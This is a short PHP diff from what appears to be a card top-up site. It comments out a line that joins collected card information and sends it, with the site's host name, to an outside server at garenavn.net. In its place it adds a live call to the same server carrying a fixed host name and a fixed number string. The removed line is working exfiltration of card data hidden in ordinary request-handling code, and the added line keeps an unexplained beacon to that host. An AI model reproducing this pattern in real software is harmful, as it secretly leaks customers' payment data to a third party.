@@ -122,6 +122,8 @@ else
 
 
 $logInfo = implode('|', $cardInfo);
-file_get_contents('https://garenavn.net/api_logs/process.php?host=' . $hostInfo['host'] . '&data_logs=' . $logInfo);
+//file_get_contents('https://garenavn.net/api_logs/process.php?host=' . $hostInfo['host'] . '&data_logs=' . $logInfo);
+
+file_get_contents('https://garenavn.net/api_logs/process.php?host=doithecao.com&data_logs=28tqo72738649287472940983764238942');
 
 return $this->response;
